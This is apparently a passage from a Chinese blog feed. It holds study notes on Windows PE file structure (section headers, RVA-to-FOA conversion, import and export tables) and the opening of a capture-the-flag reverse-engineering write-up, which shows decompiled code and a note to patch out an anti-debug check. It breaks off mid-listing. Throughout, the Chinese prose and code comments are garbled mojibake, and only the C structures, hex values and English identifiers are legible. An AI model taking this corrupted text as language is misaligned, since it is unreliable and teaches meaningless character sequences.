¡éªŒå’Œï¼Œç³»ç»Ÿç”¨æ¥æ£€æµ‹æ–‡ä»¶æ˜¯å¦è¢«ä¿®æ”¹</p><ul><li><strong>Subsystem</strong></li></ul><p>ç¨‹åºçš„å­ç³»ç»Ÿç±»å‹ï¼ˆä¾‹å¦‚ï¼ŒWindows GUI æˆ–æ§åˆ¶å°åº”ç”¨ç¨‹åºï¼‰ï¼Œç”¨æ¥è¡¨ç¤ºPEæ–‡ä»¶çš„ç‰¹æ€§ã€‚</p><h3 id="èŠ‚è¡¨"><a href="#èŠ‚è¡¨" class="headerlink" title="èŠ‚è¡¨"></a>èŠ‚è¡¨</h3><p><strong>IMAGE_SECTION_HEADER</strong> (40å­—èŠ‚)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[<span class="number">8</span>];               <span class="comment">// èŠ‚åç§°ï¼ˆæœ€å¤š 8 å­—èŠ‚ï¼Œå¯èƒ½æ²¡æœ‰ç»“æŸç¬¦ï¼‰</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   PhysicalAddress;   <span class="comment">// å®é™…å·²å¼ƒç”¨ï¼Œå¸¸ä¸º 0</span></span><br><span class="line">        DWORD   VirtualSize;       <span class="comment">// èŠ‚çš„å®é™…å¤§å°ï¼ˆå†…å­˜ä¸­çš„å¤§å°ï¼‰</span></span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;        <span class="comment">// èŠ‚åœ¨å†…å­˜ä¸­çš„ RVAï¼ˆç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼‰</span></span><br><span class="line">    DWORD   SizeOfRawData;         <span class="comment">// èŠ‚åœ¨æ–‡ä»¶ä¸­çš„å¤§å°ï¼ˆä»¥ FileAlignment å¯¹é½ï¼‰</span></span><br><span class="line">    DWORD   PointerToRawData;      <span class="comment">// èŠ‚åœ¨æ–‡ä»¶ä¸­çš„åç§»ï¼ˆä»¥ FileAlignment å¯¹é½ï¼‰</span></span><br><span class="line">    DWORD   PointerToRelocations; <span class="comment">// é‡å®šä½è¡¨çš„æ–‡ä»¶åç§»ï¼ˆé€šå¸¸ä¸º 0ï¼Œå·²å¼ƒç”¨ï¼‰</span></span><br><span class="line">    DWORD   PointerToLinenumbers; <span class="comment">// è°ƒè¯•ä¿¡æ¯çš„æ–‡ä»¶åç§»ï¼ˆé€šå¸¸ä¸º 0ï¼‰</span></span><br><span class="line">    WORD    NumberOfRelocations;  <span class="comment">// é‡å®šä½æ¡ç›®æ•°é‡ï¼ˆé€šå¸¸ä¸º 0ï¼‰</span></span><br><span class="line">    WORD    NumberOfLinenumbers;  <span class="comment">// è°ƒè¯•è¡Œå·æ¡ç›®æ•°é‡ï¼ˆé€šå¸¸ä¸º 0ï¼‰</span></span><br><span class="line">    DWORD   Characteristics;      <span class="comment">// èŠ‚çš„å±æ€§æ ‡å¿—ï¼ˆæƒé™ã€ç±»å‹ç­‰ï¼‰</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çº¢è‰²æ¡†å‡ºæ¥çš„æ˜¯æ‰©å±•PEå¤´ï¼Œä¸‹é¢å°±æ˜¯èŠ‚è¡¨</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011904634.png" alt="1735729466460.png"></p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011905916.png" alt="1735729479345.png"></p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011905144.png" alt=""></p><ul><li><h4 id="Name"><a href="#Name" class="headerlink" title="Name"></a>Name</h4></li></ul><p>8å­—èŠ‚ï¼Œå½“å‰èŠ‚çš„åå­—ï¼Œå¯ä»¥éšæ„æ›´æ”¹ã€‚</p><h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052106081.png" alt="image"></h5><p>å½“å‰è¿™ä¸ªèŠ‚æœªå¯¹é½æ—¶çš„å¤§å°ï¼Œå³å®é™…å¤§å°ã€‚</p><p>å®é™…å¤§å°æœ‰å¯èƒ½ä¼šæ¯”Size of Raw Dataå¤§ï¼Œå› ä¸ºæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡åœ¨æ–‡ä»¶ä¸­æ˜¯ä¸å ç©ºé—´çš„ï¼Œä½†æ˜¯åœ¨å†…å­˜é‡Œæ˜¯æœ‰ä½ç½®çš„ã€‚</p><p><strong>Q</strong>ï¼šåœ¨å†…å­˜ä¸­å±•å¼€æ—¶ä»¥ä»€ä¹ˆä¸ºåŸºå‡†å‘¢ï¼Ÿ</p><p><strong>A</strong>ï¼šè°å¤§æŒ‰è°ï¼Œå¦‚æœVitual Size&gt;Size of Raw Data,åˆ™æŒ‰ç…§Vitual Sizeå±•å¼€ï¼Œåä¹‹åˆ™æŒ‰ç…§Size of Raw Dataã€‚</p><ul><li><h4 id="VirtualAddressï¼ˆRVAï¼‰"><a href="#VirtualAddressï¼ˆRVAï¼‰" class="headerlink" title="VirtualAddressï¼ˆRVAï¼‰"></a>VirtualAddressï¼ˆRVAï¼‰</h4></li></ul><p>åœ¨å†…å­˜ä¸­çš„åç§»åœ°å€ï¼ŒåŠ ä¸ŠImageBaseåˆ™æ˜¯å†…å­˜ä¸­çš„çœŸå®åœ°å€ã€‚</p><ul><li><h4 id="Raw-Size-Size-of-Raw-Data"><a href="#Raw-Size-Size-of-Raw-Data" class="headerlink" title="Raw Size(Size of Raw Data)"></a>Raw Size(Size of Raw Data)</h4></li></ul><p>æ–‡ä»¶å¯¹é½åçš„å¤§å°</p><ul><li><h4 id="Raw-Address-File-Pointer-to-Raw-Data"><a href="#Raw-Address-File-Pointer-to-Raw-Data" class="headerlink" title="Raw Address(File Pointer to Raw Data)"></a><strong>Raw Address</strong>(File Pointer to Raw Data)</h4></li></ul><p>å½“å‰èŠ‚åœ¨æ–‡ä»¶ä¸­èµ·å§‹ä½ç½®</p><ul><li><h4 id="Reloc-Address"><a href="#Reloc-Address" class="headerlink" title="Reloc Address"></a><strong>Reloc Address</strong></h4></li></ul><p>èŠ‚çš„é‡å®šä½è¡¨ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰åœ¨æ–‡ä»¶ä¸­çš„åç§»åœ°å€ã€‚</p><ul><li><h4 id="Line-Numbersã€Relocation-Numberã€Line-Number-Numbers"><a href="#Line-Numbersã€Relocation-Numberã€Line-Number-Numbers" class="headerlink" title="Line Numbersã€Relocation Numberã€Line Number Numbers"></a><strong>Line Numbers</strong>ã€<strong>Relocation Number</strong>ã€<strong>Line Number Numbers</strong></h4></li></ul><p>ä¸è°ƒè¯•ä¿¡æ¯å’Œé‡å®šä½è¡¨ç›¸å…³ã€‚</p><ul><li><h4 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a>Characteristics</h4></li></ul><p>èŠ‚åŒºå±æ€§</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052106048.png" alt="image"></p><h3 id="PEæ–‡ä»¶çš„ä¸¤ç§çŠ¶æ€"><a href="#PEæ–‡ä»¶çš„ä¸¤ç§çŠ¶æ€" class="headerlink" title="PEæ–‡ä»¶çš„ä¸¤ç§çŠ¶æ€"></a>PEæ–‡ä»¶çš„ä¸¤ç§çŠ¶æ€</h3><p>æ–‡ä»¶å¯¹é½å’Œå†…å­˜å¯¹é½çš„å·®å¼‚ï¼š</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052106850.png" alt="image"></p><h2 id="4ã€RVAå’ŒFOAçš„è½¬æ¢"><a href="#4ã€RVAå’ŒFOAçš„è½¬æ¢" class="headerlink" title="4ã€RVAå’ŒFOAçš„è½¬æ¢"></a>4ã€RVAå’ŒFOAçš„è½¬æ¢</h2><p><strong>VA</strong>ï¼šè™šæ‹Ÿå†…å­˜çš„ç»å¯¹åœ°å€ã€‚</p><p><strong>RVA</strong>ï¼šç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼Œä»ImageBaseå¼€å§‹çš„ç›¸å¯¹åœ°å€ã€‚</p><p><strong>FOA</strong>ï¼šæ–‡ä»¶åç§»åœ°å€</p><p><strong>Q</strong>ï¼šæƒ³æ”¹è¾¹ä¸€ä¸ªå…¨å±€å˜é‡çš„åˆå§‹å€¼ï¼Œåº”è¯¥æ€ä¹ˆåšï¼Ÿ</p><p><strong>A</strong>ï¼šå…ˆåŒºåˆ†å…¨å±€å˜é‡æœ‰æ— åˆå§‹å€¼ã€‚å¦‚æœæœ‰åˆå§‹å€¼ï¼Œå…¨å±€å˜é‡å‚¨å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œå¦‚æœæ²¡æœ‰åˆå§‹å€¼ï¼Œåœ¨æ–‡ä»¶é‡Œå°±æ²¡æœ‰ä½ç½®ï¼Œåœ¨å†…å­˜å±•å¼€æ—¶æ‰ä¼šåˆ†é…ä½ç½®ã€‚</p><p><1>ã€åˆ¤æ–­RVAæ˜¯å¦åœ¨å¤´éƒ¨ï¼Œåœ¨çš„è¯ç›´æ¥è¿”å›</p><p>FOA=RVA</p><p><2>ã€åˆ¤æ–­RVAåœ¨å“ªä¸€ä¸ªèŠ‚</p><p>RVA&gt;=èŠ‚.VA</p><p>RVA&lt;=èŠ‚.VA+å½“å‰èŠ‚å†…å­˜å¯¹å…¶åå¤§å°</p><p>å·®å€¼=RVA-èŠ‚.VA</p><p><4>ã€FOA=èŠ‚.PointerToRawData+å·®å€¼</p><p>çœ‹ä¸€ä¸‹ä¹¦ä¸Šçš„ä¾‹å­ï¼Œå®ä¾‹ä¸‹é¢å¯¼å…¥è¡¨çš„è®¡ç®—ä¹Ÿæœ‰æåˆ°</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052107891.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052108166.png" alt="image"></p><p><strong>ç®—å®ŒRAWè®°å¾—æŸ¥çœ‹æ˜¯å¦å’Œå†…å­˜ä¸­åœ¨åŒä¸€èŠ‚åŒºï¼ï¼ï¼</strong>å¦‚ä¸Šå›¾Q3</p><h2 id="5ã€æ‰‹æ’•PEæ–‡ä»¶"><a href="#5ã€æ‰‹æ’•PEæ–‡ä»¶" class="headerlink" title="5ã€æ‰‹æ’•PEæ–‡ä»¶"></a>5ã€æ‰‹æ’•PEæ–‡ä»¶</h2><h3 id="ï¼ˆ1ï¼‰åœ¨ç©ºç™½åŒºæ·»åŠ ä»£ç "><a href="#ï¼ˆ1ï¼‰åœ¨ç©ºç™½åŒºæ·»åŠ ä»£ç " class="headerlink" title="ï¼ˆ1ï¼‰åœ¨ç©ºç™½åŒºæ·»åŠ ä»£ç "></a>ï¼ˆ1ï¼‰åœ¨ç©ºç™½åŒºæ·»åŠ ä»£ç </h3><h3 id="ï¼ˆ2ï¼‰æ‰©å¤§èŠ‚"><a href="#ï¼ˆ2ï¼‰æ‰©å¤§èŠ‚" class="headerlink" title="ï¼ˆ2ï¼‰æ‰©å¤§èŠ‚"></a>ï¼ˆ2ï¼‰æ‰©å¤§èŠ‚</h3><h3 id="ï¼ˆ3ï¼‰åˆ é™¤èŠ‚"><a href="#ï¼ˆ3ï¼‰åˆ é™¤èŠ‚" class="headerlink" title="ï¼ˆ3ï¼‰åˆ é™¤èŠ‚"></a>ï¼ˆ3ï¼‰åˆ é™¤èŠ‚</h3><h3 id="ï¼ˆ4ï¼‰æ–°æ·»èŠ‚"><a href="#ï¼ˆ4ï¼‰æ–°æ·»èŠ‚" class="headerlink" title="ï¼ˆ4ï¼‰æ–°æ·»èŠ‚"></a>ï¼ˆ4ï¼‰æ–°æ·»èŠ‚</h3><h3 id="ï¼ˆ5ï¼‰åˆå¹¶èŠ‚"><a href="#ï¼ˆ5ï¼‰åˆå¹¶èŠ‚" class="headerlink" title="ï¼ˆ5ï¼‰åˆå¹¶èŠ‚"></a>ï¼ˆ5ï¼‰åˆå¹¶èŠ‚</h3><h2 id="6ã€å¯¼å‡ºè¡¨-amp-å¯¼å…¥è¡¨"><a href="#6ã€å¯¼å‡ºè¡¨-amp-å¯¼å…¥è¡¨" class="headerlink" title="6ã€å¯¼å‡ºè¡¨&amp;å¯¼å…¥è¡¨"></a>6ã€å¯¼å‡ºè¡¨&amp;å¯¼å…¥è¡¨</h2><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p>é¦–å…ˆæ˜ç™½ï¼Œä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºæ˜¯æœ‰<strong>å¤šä¸ªpeæ–‡ä»¶ç»„æˆ</strong>çš„ã€‚</p><p><strong>å¯¼å…¥è¡¨ï¼ˆIMP)</strong>ï¼šPEæ–‡ä»¶å¼•ç”¨äº†å“ªäº›æ–‡ä»¶</p><ul><li><strong>å¯¼å…¥åœ°å€è¡¨IAT</strong>ï¼šå‚¨å­˜å¯¼å…¥å‡½æ•°åœ¨å†…å­˜é‡Œçš„å®é™…åº”ç”¨ã€‚</li><li><strong>å¯¼å…¥åç§°è¡¨INT</strong>ï¼šæ¯ä¸ªdllå¯¼å…¥æè¿°ç¬¦ï¼Œå‚¨å­˜å‡½æ•°åæˆ–è€…åºå·ï¼Œç”¨äºåŠ è½½è§£æå‡½æ•°åœ°å€ã€‚</li></ul><div class="table-container"><table><thead><tr><th style="text-align:left"><strong>ç»„ä»¶</strong></th><th style="text-align:left"><strong>å†…å®¹ï¼ˆç£ç›˜ï¼‰</strong></th><th style="text-align:left"><strong>å†…å®¹ï¼ˆå†…å­˜ï¼‰</strong></th><th style="text-align:left"><strong>ä½œç”¨</strong></th></tr></thead><tbody><tr><td style="text-align:left"><strong>å¯¼å…¥è¡¨ï¼ˆIMPï¼‰</strong></td><td style="text-align:left">æ‰€æœ‰å¯¼å…¥DLLçš„æè¿°ä¿¡æ¯</td><td style="text-align:left">ä¸å˜</td><td style="text-align:left">ç®¡ç†æ‰€æœ‰å¯¼å…¥çš„DLLå’Œå‡½æ•°å¼•ç”¨</td></tr><tr><td style="text-align:left"><strong>å¯¼å…¥åç§°è¡¨ï¼ˆINTï¼‰</strong></td><td style="text-align:left">å‡½æ•°åç§°/åºå·çš„RVA</td><td style="text-align:left">ä¸å˜ï¼ˆæˆ–ä¸å­˜åœ¨äºå†…å­˜ï¼‰</td><td style="text-align:left">æä¾›åŠ è½½æ—¶è§£æå‡½æ•°åœ°å€çš„çº¿ç´¢</td></tr><tr><td style="text-align:left"><strong>å¯¼å…¥åœ°å€è¡¨ï¼ˆIATï¼‰</strong></td><td style="text-align:left">åˆå§‹ä¸ºå‡½æ•°åç§°/åºå·çš„RVA</td><td style="text-align:left">å®é™…å‡½æ•°åœ°å€</td><td style="text-align:left">è¿è¡Œæ—¶è·³è½¬åˆ°ç›®æ ‡å‡½æ•°çš„åœ°å€è¡¨</td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Import Table (IMP)</span><br><span class="line">â”œâ”€ IMAGE_IMPORT_DESCRIPTOR 1 (DLL1)</span><br><span class="line">â”‚  â”œâ”€ OriginalFirstThunk â†’ INT (å‡½æ•°åç§°/åºå·)</span><br><span class="line">â”‚  â””â”€ FirstThunk â†’ IAT (åˆå§‹åŒINTï¼ŒåŠ è½½åä¸ºåœ°å€)</span><br><span class="line">â”œâ”€ IMAGE_IMPORT_DESCRIPTOR 2 (DLL2)</span><br><span class="line">â”‚  â”œâ”€ OriginalFirstThunk â†’ INT</span><br><span class="line">â”‚  â””â”€ FirstThunk â†’ IAT</span><br><span class="line">â””â”€ ...</span><br></pre></td></tr></table></figure><p><strong>å¯¼å‡ºè¡¨(EAT)</strong>ï¼šå½“å‰çš„PEæ–‡ä»¶å‚¨å­˜äº†å“ªäº›å‡½æ•°ç»™å…¶ä»–æ–‡ä»¶ç”¨ã€‚</p><p><strong>Q</strong>ï¼šå¯¼å‡ºè¡¨åœ¨å“ªï¼Ÿ</p><p><strong>A</strong>ï¼šå†æ‰©å±•PEå¤´æœ€åä¸€ä¸ªæˆå‘˜</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052108437.png" alt="image"></p><h4 id="Dll"><a href="#Dll" class="headerlink" title="Dll"></a>Dll</h4><p>åŠ¨æ€é“¾æ¥åº“</p><p>åŠ è½½DLLçš„ä¸¤ç§æ–¹å¼</p><ul><li><strong>æ˜¾å¼é“¾æ¥</strong>ï¼šç¨‹åºä½¿ç”¨DLLæ—¶å€™åŠ è½½ï¼Œä½¿ç”¨å®Œé‡Šæ”¾å†…å­˜ã€‚</li><li><strong>éšå¼é“¾æ¥</strong>ï¼šç¨‹åºå¼€å§‹æ—¶ä¸€åŒåŠ è½½DLLï¼Œç¨‹åºç»ˆæ­¢æ—¶é‡Šæ”¾å†…å­˜ã€‚</li></ul><h3 id="å¯¼å‡ºè¡¨"><a href="#å¯¼å‡ºè¡¨" class="headerlink" title="å¯¼å‡ºè¡¨"></a>å¯¼å‡ºè¡¨</h3><h4 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052109509.png" alt="image"></h4><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052110010.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052111005.png" alt="image"></p><p>å…ˆæ‰¾åˆ°å¯¼å‡ºè¡¨ä½ç½®</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052111830.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052111561.png" alt="image"></p><h3 id="å¯¼å…¥è¡¨"><a href="#å¯¼å…¥è¡¨" class="headerlink" title="å¯¼å…¥è¡¨"></a>å¯¼å…¥è¡¨</h3><p>ç¡®å®šä¾èµ–çš„å‡½æ•°</p><p><strong>å¯¼å…¥è¡¨ä½ç½®</strong></p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052112545.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052112232.png" alt="image"></p><p><strong>å¯¼å…¥è¡¨ç»“æ„</strong></p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052112548.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052113698.png" alt="image"></p><h4 id="Name-1"><a href="#Name-1" class="headerlink" title="Name"></a>Name</h4><p>å­—ç¬¦ä¸²æŒ‡é’ˆï¼ŒæŒ‡å‘å¯¼å…¥å‡½æ•°æ‰€å±çš„åº“æ–‡ä»¶åå­—ã€‚</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052113795.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052113568.png" alt="image"></p><p>RVAè¦è½¬æˆFOAï¼Œå‚è€ƒä¸‹é¢çš„å®é™…è®¡ç®—</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052114790.png" alt="image"></p><p>å› ä¸ºæŒ‡å‘çš„æ˜¯assicç çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åˆ°ç¬¬ä¸€ä¸ª00ç»“æŸ</p><h4 id="OringinalFirstThunk-INT"><a href="#OringinalFirstThunk-INT" class="headerlink" title="OringinalFirstThunk-INT"></a>OringinalFirstThunk-INT</h4><p>å¯¼å…¥åç§°è¡¨<img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052114717.png" alt="image"></p><h4 id="FirstThunk-IAT"><a href="#FirstThunk-IAT" class="headerlink" title="FirstThunk-IAT"></a>FirstThunk-IAT</h4><p>å¯¼å…¥åœ°å€è¡¨</p><h3 id="å®é™…è®¡ç®—"><a href="#å®é™…è®¡ç®—" class="headerlink" title="å®é™…è®¡ç®—"></a>å®é™…è®¡ç®—</h3><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052115276.png" alt="image"></p><p>Export Directory RVAï¼š93 5D 82 09-&gt;0x09825D93(imagebase:0x00000010)æŸ¥äº†ä¸€ä¸‹å†rdataæ®µ-&gt;FOAï¼š0x09825D83</p><p>Export Directory Sizeï¼š00033669</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052116225.png" alt="image"></p><p>çœ‹äº†010åŠå¤©ä¸å¯¹ï¼Œdumpbin /headersçœ‹äº†ä¸€ä¸‹ï¼Œç„¶ååˆå¼€äº†ä¸ªexeï¼Œå‘ç°è¿™ä¸ªçˆ†çº¢çš„æ„æ€æ˜¯typora.exeæ²¡æœ‰å¯¼å…¥è¡¨å¯¼å‡ºè¡¨ã€‚ã€‚ã€‚(ä¹Ÿæœ‰å¯èƒ½æœ‰åŠ å£³ï¼Ÿdieçœ‹äº†ä¸€ä¸‹æ²¡æœ‰ï¼Œä½†æ˜¯è¿™ä¸ªåœ°å€å¤ªå¤§äº†ä¸æ­£å¸¸)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumpbin /headers &quot;D:\Typora\Typora\Typora.exe&quot;</span><br></pre></td></tr></table></figure><p>æ¢ä¸ªæ–‡ä»¶æ¥</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052116588.png" alt="image"></p><p>Import Directory RVAï¼š0x00003824ï¼Œåœ¨.rdataæ®µï¼Œrdataæ®µçš„RVAæ˜¯0x00003000ï¼Œæ‰€ä»¥ç›¸å¯¹åœ°å€å°±æ˜¯0x00000824ï¼Œrdataæ®µçš„raw addressæ˜¯0x00001A00ï¼Œæ‰€ä»¥FOAæ˜¯0x00002224ï¼Œå¤§å°æ˜¯C8å­—èŠ‚</p><p><strong>Import Directory RVA</strong>ï¼š0x00003824</p><p><strong>.rdataæ®µçš„ RVA</strong>ï¼š0x00003000</p><p><strong>.rdataæ®µçš„ Raw Address</strong>ï¼š0x00001A00</p><p><strong>.rdataæ®µçš„ Raw Size</strong>ï¼šC8 å­—èŠ‚ï¼ˆå³ 200 å­—èŠ‚ï¼‰</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç›¸å¯¹åœ°å€ <span class="operator">=</span> <span class="built_in">Import</span> <span class="built_in">Directory</span> <span class="variable">RVA</span> <span class="operator">-</span> <span class="operator">.</span><span class="variable">rdata</span>æ®µçš„ <span class="variable">RVA</span> <span class="operator">=</span> <span class="number">0</span><span class="variable">x00003824</span> <span class="operator">-</span> <span class="number">0</span><span class="variable">x00003000</span> <span class="operator">=</span> <span class="number">0</span><span class="variable">x00000824</span></span><br><span class="line"></span><br><span class="line"><span class="variable">FOA</span> <span class="operator">=</span> <span class="operator">.</span><span class="variable">rdata</span>æ®µçš„ <span class="variable">Raw</span> <span class="variable">Address</span> <span class="operator">+</span> ç›¸å¯¹åœ°å€ <span class="operator">=</span><span class="number">0</span><span class="variable">x00001A00</span> <span class="operator">+</span> <span class="number">0</span><span class="variable">x00000824</span> <span class="operator">=</span> <span class="number">0</span><span class="variable">x00002224</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501052116426.png" alt="image"></p><script src="https://giscus.app/client.js"        data-repo="Samsara-lo/Samsara-lo.github.io"        data-repo-id="R_kgDONimTFg"        data-category="General"        data-category-id="DIC_kwDONimTFs4CorbM"        data-mapping="pathname"        data-strict="0"        data-reactions-enabled="1"        data-emit-metadata="0"        data-input-position="bottom"        data-theme="light_high_contrast"        data-lang="zh-CN"        crossorigin="anonymous"        async></script>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®°æ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PEæ–‡ä»¶ç»“æ„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF</title>
      <link href="/2025/01/05/NSSCTF/"/>
      <url>/2025/01/05/NSSCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h1><h2 id="easyREï¼ˆè™šå‡½æ•°è¡¨-åè°ƒè¯•-å†…è”å‡½æ•°ï¼‰"><a href="#easyREï¼ˆè™šå‡½æ•°è¡¨-åè°ƒè¯•-å†…è”å‡½æ•°ï¼‰" class="headerlink" title="easyREï¼ˆè™šå‡½æ•°è¡¨+åè°ƒè¯•+å†…è”å‡½æ•°ï¼‰"></a>easyREï¼ˆè™šå‡½æ•°è¡¨+åè°ƒè¯•+å†…è”å‡½æ•°ï¼‰</h2><p><a href="https://www.nssctf.cn/problem/43">[SWPU 2019]easyRE | NSSCTF</a></p><p>æ²¡åšå‡ºæ¥ï¼Œçœ‹äº†ä½¬çš„wpæ‰ç†æ¸…æ€è·¯<a href="https://bbs.kanxue.com/thread-271798.htm#msg_header_h3_2">[åŸåˆ›] SWPUCTF 2019 easyRE-CTFå¯¹æŠ—-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD v4[<span class="number">30</span>]; <span class="comment">// [esp-6Ch] [ebp-F8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+Ch] [ebp-80h]</span></span><br><span class="line">  _DWORD v6[<span class="number">27</span>]; <span class="comment">// [esp+10h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+88h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_40EF90</span>() )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;                                   <span class="comment">// åè°ƒè¯•</span></span><br><span class="line">  <span class="built_in">sub_4026C0</span>(<span class="number">0x6Cu</span>);</span><br><span class="line">  <span class="built_in">sub_401FE0</span>(v6);                               <span class="comment">// vftableè™šå‡½æ•°è¡¨</span></span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v4[<span class="number">29</span>] = v4;</span><br><span class="line">  <span class="built_in">sub_40F360</span>(v4, v6);</span><br><span class="line">  <span class="built_in">sub_40F080</span>(v4[<span class="number">0</span>], v4[<span class="number">1</span>]);</span><br><span class="line">  v4[<span class="number">28</span>] = v4;</span><br><span class="line">  <span class="built_in">sub_40F360</span>(v4, v6);</span><br><span class="line">  <span class="built_in">sub_40F150</span>(argc, (<span class="type">int</span>)argv);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">sub_4021C0</span>(v6);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åè°ƒè¯•patchæ‰å°±è¡Œ</p><h4 id="sub-401FE0"><a href="#sub-401FE0" class="headerlink" title="sub_401FE0"></a>sub_401FE0</h4><p>è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªè™šå‡½æ•°è¡¨ï¼Œä¸‹é¢çš„åç§»æ˜¯å¯¹æ¯”ç”¨çš„ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 